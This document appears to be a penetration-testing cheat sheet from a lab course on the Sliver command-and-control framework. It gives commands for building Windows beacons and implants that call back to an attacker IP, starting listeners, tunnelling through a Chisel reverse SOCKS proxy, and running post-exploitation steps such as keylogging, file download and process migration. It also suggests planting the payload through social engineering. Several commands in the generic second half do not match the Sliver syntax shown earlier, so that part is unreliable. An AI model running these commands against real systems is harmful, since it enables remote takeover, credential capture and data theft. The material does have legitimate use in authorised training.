
### Server initialization examples
- start server on kali
```bash
sliver-server
```
- generate a beacon
```shell-session
generate beacon --http 10.10.16.14:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save <directory>
```
- generate an implant
```shell-session
generate --http 10.10.16.14:8088 --skip-symbols --os windows --arch amd64 --format exe --save <directory>
```
- start listeners
```shell-session
http -L 10.10.16.14 -l 8088 --website delivery
```
```shell-session
http -L 10.10.16.14 -l 9001
```

Need to transfer the implant, beacon, or both to the victim machine and execute the payloads to receive a connection back to the sliver server instance.

#### Making a mistake in the ip address for a implant of some kind and how to regenerate it

- use command `implants` to list all the generated implants
- `implants rm <implant name>` will delete the implant from the list
- regenerate the implant as shown below:
```shell-session
[server] sliver > generate beacon --http 10.10.16.14:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save /home/roger/Documents/HTB/Academy/Sliver/Pivoting

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[!] rpc error: code = Unknown desc = UNIQUE constraint failed: implant_builds.name

[server] sliver > implants

 Name                Implant Type   Template   OS/Arch             Format   Command & Control              Debug 
=================== ============== ========== =============== ============ ============================== =======
 ACCEPTED_SNOWPLOW   session        sliver     windows/amd64   EXECUTABLE   [1] https://10.10.16.14        false 
 BOLD_WHIP           session        sliver     windows/amd64   EXECUTABLE   [1] https://10.10.16.14:8088   false 
 http-beacon-9001    beacon         sliver     windows/amd64   EXECUTABLE   [1] https://10.10.14.62:9001   false 

[server] sliver > help implants

List implant builds

Usage:
======
  implants [flags]

Flags:
======
  -a, --arch          string    filter builds by cpu architecture
  -f, --format        string    filter builds by artifact format
  -h, --help                    display help
  -d, --no-debug                filter builds by debug flag
  -b, --only-beacons            filter beacons
  -s, --only-sessions           filter interactive sessions
  -o, --os            string    filter builds by operating system
  -t, --timeout       int       command timeout in seconds (default: 60)

Sub Commands:
=============
  rm  Remove implant build

[server] sliver > implants rm http-beacon-9001

? Remove 'http-beacon-9001' build? Yes

[server] sliver > generate beacon --http 10.10.16.14:9001 --skip-symbols --os windows --arch amd64 -N http-beacon-9001 --save /home/roger/Documents/HTB/Academy/Sliver/Pivoting

[*] Generating new windows/amd64 beacon implant binary (1m0s)
[!] Symbol obfuscation is disabled
[*] Build completed in 1s
[*] Implant saved to /home/roger/Documents/HTB/Academy/Sliver/Pivoting/http-beacon-9001.exe

```

### Pivoting using Chisel

- make sure proxychains.conf is configured for socks5 port 9050
- start chisel server on attack box outside of sliver
```bash
./chisel_1.8.1_linux_arm64 server --reverse -p 1337 -v --socks5
```
- send chisel command to beacon
```shell-session
chisel client 10.10.16.14:1337 R:socks
```
- wait for the beacon to execute the connection
```bash
 ./chisel_1.8.1_linux_arm64 server --reverse -p 1337 -v --socks5
2024/06/19 16:06:41 server: Reverse tunnelling enabled
2024/06/19 16:06:41 server: Fingerprint agCO4/5IHu/zX9sZcA81hln7RTIHGtFsTZIugte3jh0=
2024/06/19 16:06:41 server: Listening on http://0.0.0.0:1337
2024/06/19 16:08:09 server: session#1: Handshaking with 10.129.205.234:49898...
2024/06/19 16:08:10 server: session#1: Verifying configuration
2024/06/19 16:08:10 server: session#1: Client version (v1.8.1) differs from server version (1.8.1)
2024/06/19 16:08:10 server: session#1: tun: Created (SOCKS enabled)
2024/06/19 16:08:10 server: session#1: tun: SSH connected
2024/06/19 16:08:10 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
2024/06/19 16:08:10 server: session#1: tun: Bound proxies

```
- need to start socks5 on sliver-server
```shell-session
socks5 start -P 9050
```


## Command Examples:

The Sliver C2 framework is a powerful and flexible post-exploitation command and control tool. Here is a list of common commands you can use with Sliver for generating payloads and performing post-exploitation activities. Note that the exact commands may vary depending on the version of Sliver you are using. For the most up-to-date information, consult the official Sliver documentation or use the help commands within the Sliver console.

### Payload Generation Commands

1. **Generate an HTTP payload**:
   ```bash
   generate --http --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
   ```

2. **Generate an HTTPS payload**:
   ```bash
   generate --https --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
   ```

3. **Generate a DNS payload**:
   ```bash
   generate --dns --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
   ```

4. **Generate a TCP payload**:
   ```bash
   generate --tcp --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
   ```

5. **Generate a stageless payload**:
   ```bash
   generate --stageless --http --host <C2_HOST> --port <C2_PORT> --save <FILENAME>
   ```

6. **Generate a payload for a specific platform**:
   ```bash
   generate --http --host <C2_HOST> --port <C2_PORT> --save <FILENAME> --platform <PLATFORM>
   ```

### Post-Exploitation Commands

1. **List active sessions**:
   ```bash
   sessions
   ```

2. **Interact with a session**:
   ```bash
   use <SESSION_ID>
   ```

3. **Execute a command on the target system**:
   ```bash
   shell <COMMAND>
   ```

4. **Upload a file to the target system**:
   ```bash
   upload <LOCAL_FILE> <REMOTE_PATH>
   ```

5. **Download a file from the target system**:
   ```bash
   download <REMOTE_FILE> <LOCAL_PATH>
   ```

6. **List files in a directory on the target system**:
   ```bash
   ls <REMOTE_DIRECTORY>
   ```

7. **Change directory on the target system**:
   ```bash
   cd <REMOTE_DIRECTORY>
   ```

8. **Capture a screenshot from the target system**:
   ```bash
   screenshot
   ```

9. **Record keystrokes on the target system**:
   ```bash
   keylogger start
   ```

10. **Stop recording keystrokes on the target system**:
    ```bash
    keylogger stop
    ```

11. **Retrieve recorded keystrokes**:
    ```bash
    keylogger dump
    ```

12. **List processes running on the target system**:
    ```bash
    ps
    ```

13. **Kill a process on the target system**:
    ```bash
    kill <PROCESS_ID>
    ```

14. **Migrate the implant to another process**:
    ```bash
    migrate <PROCESS_ID>
    ```

15. **Run a built-in command (e.g., port scan, file search)**:
    ```bash
    run <COMMAND>
    ```

16. **Execute a script on the target system**:
    ```bash
    execute <SCRIPT_PATH>
    ```

17. **Spawn a new shell on the target system**:
    ```bash
    spawn <SHELL_TYPE>
    ```

18. **Check the implant's status and configuration**:
    ```bash
    status
    ```

### Example Workflow

1. **Generate a payload**:
   ```bash
   generate --https --host 192.168.1.10 --port 443 --save payload.exe
   ```

2. **Launch the payload on the target system** (e.g., by using social engineering or a vulnerability).

3. **List active sessions**:
   ```bash
   sessions
   ```

4. **Interact with the active session**:
   ```bash
   use 1
   ```

5. **Perform post-exploitation activities** (e.g., uploading/downloading files, executing commands):
   ```bash
   whoami
   upload C:\local\file.txt C:\remote\file.txt
   download C:\remote\file.txt C:\local\file.txt
   ```

### Useful Built-in Commands

1. **Port scan**:
   ```bash
   run portscan <TARGET_IP> <PORT_RANGE>
   ```

2. **Search for files**:
   ```bash
   run search -d <DIRECTORY> -p <PATTERN>
   ```

3. **Gather system information**:
   ```bash
   run sysinfo
   ```

4. **Gather network information**:
   ```bash
   run netinfo
   ```

These commands provide a good starting point for using the Sliver C2 framework for both payload generation and post-exploitation activities. Always refer to the official Sliver documentation for the most accurate and comprehensive information.